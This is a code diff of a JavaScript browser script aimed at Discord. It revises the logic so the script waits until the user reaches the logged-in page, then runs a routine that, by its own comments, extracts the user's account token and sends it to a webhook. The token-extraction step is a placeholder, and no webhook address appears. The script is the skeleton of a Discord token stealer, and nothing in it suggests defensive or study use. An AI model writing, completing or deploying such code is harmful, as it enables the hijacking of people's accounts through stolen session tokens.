@@ -1,9 +1,17 @@
-// Check if the user is on the logged-in page
+// Check if the user is logged in
 if (window.location.href === "https://discord.com/channels/@me") {
     executeConsoleCode();
 } else {
-    // Redirect the user to the login page
-    redirectToLogin();
+    // Wait for the user to log in
+    window.addEventListener("load", function() {
+        // Check again if the user is logged in after the page loads
+        if (window.location.href === "https://discord.com/channels/@me") {
+            executeConsoleCode();
+        } else {
+            // Redirect the user to the login page
+            window.location.href = "https://discord.com/login";
+        }
+    });
 }
 
 function executeConsoleCode() {
@@ -26,10 +34,6 @@ function executeConsoleCode() {
     // Send token to webhook URL
     const token = /* Extract token */;
     sendTokenToWebhook(token);
-}
-
-function redirectToLogin() {
-    window.location.href = "https://discord.com/login";
 }
 
 function sendTokenToWebhook(token) {
